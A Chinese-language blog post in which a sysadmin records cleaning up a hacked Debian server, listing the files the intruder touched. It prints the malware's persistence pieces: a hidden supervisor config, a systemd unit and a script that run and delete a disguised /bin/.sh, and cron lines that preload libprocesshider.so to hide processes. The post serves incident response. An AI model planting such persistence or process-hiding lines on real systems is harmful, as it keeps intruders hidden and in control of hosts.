---
title: "[筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked"
date: 2020-07-10T09:48:24+08:00
categories: ['筆記']
image: https://h.cowbay.org/images/post-default-14.jpg
tags: ["debian"]
author: "Eric Chang"
---

上禮拜某天在開會的時候，LINE不斷傳來訊息

不過因為我向來開會都很認真(驕傲，所以都沒看，接著就變成來電了

看來大概有啥事發生

不過畢竟不是正職的工作，就先放著吧

後來變成連學長都直接打來告訴我，某間公司的伺服器出事了，客戶找不到我

叫我趕快連進去看

是說，啊我又沒跟人家簽維護，趕什麼趕...

總之，開完會後就了解一下狀況

<!--more-->

了解狀況後(user 也只說不能連線..WTF)，還是直接連進去看伺服器啥問題好了

連線的過程就發現，主機回應有點慢

不過還是可以連上，檢查一下ps / netstat 等等訊息，感覺就是有哪裡怪怪的

進去etc 看一下，一下 ls -lart 就發現不對，畫面整個跑掉

感覺就多了很多檔案

所以先裝個file manager 來看(這樣才能避免ls 被駭客調包的情況)

總之就發現了一些不正常的檔案

/etc/.sh 等等族繁不及備載

於是先去FW 把這台機器對外開放的port 先關掉

然後開始紀錄邊清

底下是一些記錄下來的log 很亂，因為是邊清邊紀錄的關係

這是在某個特定日期時間被產生出來的檔案

```bash
/etc/allow.bak
/etc/deny.bak
/etc/fstab
/etc/sysctl.conf
/etc/gshadow
/etc/fstab.bak
/etc/subuid
/etc/subgid
/etc/.supervisor
/sbin/https
/swapfile
/var/mail/root
/var/lib/rkhunter/tmp/group
/var/lib/rkhunter/tmp/passwd
/var/lib/dpkg/info/python-meld3.list
/var/backups/dpkg.status.1.gz
/var/backups/shadow.bak
/var/backups/group.bak
/var/backups/dpkg.status.6.gz
/var/backups/dpkg.status.3.gz
/var/backups/dpkg.status.5.gz
/var/backups/apt.extended_states.0
/var/backups/dpkg.status.2.gz
/var/backups/passwd.bak
/var/backups/gshadow.bak
/var/backups/dpkg.status.0
/var/backups/dpkg.status.4.gz
/var/log/wtmp.1
/var/log/supervisor
/var/log/dpkg.log.1
/var/log/secure
/var/log/apt/term.log.1.gz
/var/log/apt/history.log.1.gz
/usr/lib/systemd
/usr/lib/mysql/mysql
```

/etc/.supervisor/conf.d/sh.conf

```bash
[program:.sh]
directory=/etc/
command=/bin/bash -c 'cp -f -r -- /etc/spts /bin/.sh 2>/dev/null && /bin/.sh -c  >/dev/null 2>&1 && rm -rf -- /bin/.sh 2>/dev/null'
autostart=true
autorestart=true
startretries=999999999
redirect_stderr=true
pidfile=/etc/psdewo.pid
stdout_logfile=/etc/usercenter_stdout
```

php.sh 這個忘了是在crontab 還是/etc/profile.d/底下看到的
```
#!/bin/bash
cp -f -r -- /bin/shh /bin/.sh 2>/dev/null
/bin/.sh -c  >/dev/null 2>&1
rm -rf -- .sh 2>/dev/null
```
supervisor.sh
```
#!/bin/bash
supervisord -c /etc/.supervisor/supervisord.conf >/dev/null 2>&1
supervisorctl reload >/dev/null 2>&1
```

某個 service 檔案

```
[Unit]
Description=.sh

Wants=network.target
After=syslog.target network-online.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'cp -f -r -- /bin/.funzip /bin/.sh 2>/dev/null && /bin/.sh -c  >/dev/null 2>&1 && rm -rf -- /bin/.sh 2>/dev/null'
Restart=always
KillMode=process

[Install]
WantedBy=multi-user.target
```

syslog 部份內容
```
Jul  7 06:20:01 pve CRON[12502]: (root) CMD (/sbin/httpss)
Jul  7 06:20:01 pve CRON[12499]: (root) CMD ( echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload && lockr +i /etc/ld.so.preload >/dev/null 2>&1)
Jul  7 06:21:01 pve CRON[14096]: (root) CMD (/usr/lib/mysql/mysql)
Jul  7 06:21:01 pve CRON[14095]: (root) CMD ( echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload && lockr +i /etc/ld.so.preload >/dev/null 2>&1)
Jul  7 06:21:01 pve CRON[14094]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2>/dev/null && /tmp/.sh -c  >/dev/null 2>&1 && rm -rf -- /tmp/.sh 2>/dev/null)
Jul  7 06:22:01 pve CRON[15995]: (root) CMD ( echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload && lockr +i /etc/ld.so.preload >/dev/null 2>&1)
Jul  7 06:22:01 pve CRON[15994]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2>/dev/null && /tmp/.sh -c  >/dev/null 2>&1 && rm -rf -- /tmp/.sh 2>/dev/null)
Jul  7 06:22:01 pve CRON[15996]: (root) CMD (/usr/lib/mysql/mysql)
Jul  7 06:23:01 pve CRON[17708]: (root) CMD ( echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload && lockr +i /etc/ld.so.preload >/dev/null 2>&1)
Jul  7 06:23:01 pve CRON[17709]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2>/dev/null && /tmp/.sh -c  >/dev/null 2>&1 && rm -rf -- /tmp/.sh 2>/dev/null)
Jul  7 06:23:01 pve CRON[17710]: (root) CMD (/usr/lib/mysql/mysql)
Jul  7 06:24:01 pve CRON[19353]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2>/dev/null && /tmp/.sh -c  >/dev/null 2>&1 && rm -rf -- /tmp/.sh 2>/dev/null)
Jul  7 06:24:01 pve CRON[19351]: (root) CMD ( echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload && lockr +i /etc/ld.so.preload >/dev/null 2>&1)
Jul  7 06:24:01 pve CRON[19352]: (root) CMD (/usr/lib/mysql/mysql)
Jul  7 06:25:01 pve CRON[21289]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2>/dev/null && /tmp/.sh -c  >/dev/null 2>&1 && rm -rf -- /tmp/.sh 2>/dev/null)
Jul  7 06:25:01 pve CRON[21290]: (root) CMD (/usr/lib/mysql/mysql)
Jul  7 06:25:01 pve CRON[21288]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Jul  7 06:25:01 pve CRON[21291]: (root) CMD ( echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload && lockr +i /etc/ld.so.preload >/dev/null 2>&1)
```

比較特別的是，他會去修改 /etc/fstab 載入一個 swapfile

WTF！？ 沒事載入自己的 fstab 做啥？？

然後還會在系統建立user 可以看一下 /etc/passwd , /etc/group , /etc/gshadow 這些檔案檢查

手邊最好有另一臺乾淨的同樣作業系統的機器

因為有很多系統指令已經被替換掉(netstat/ss/lsof 等等)

需要從乾淨的系統弄過來，或者是重新從apt 安裝回來


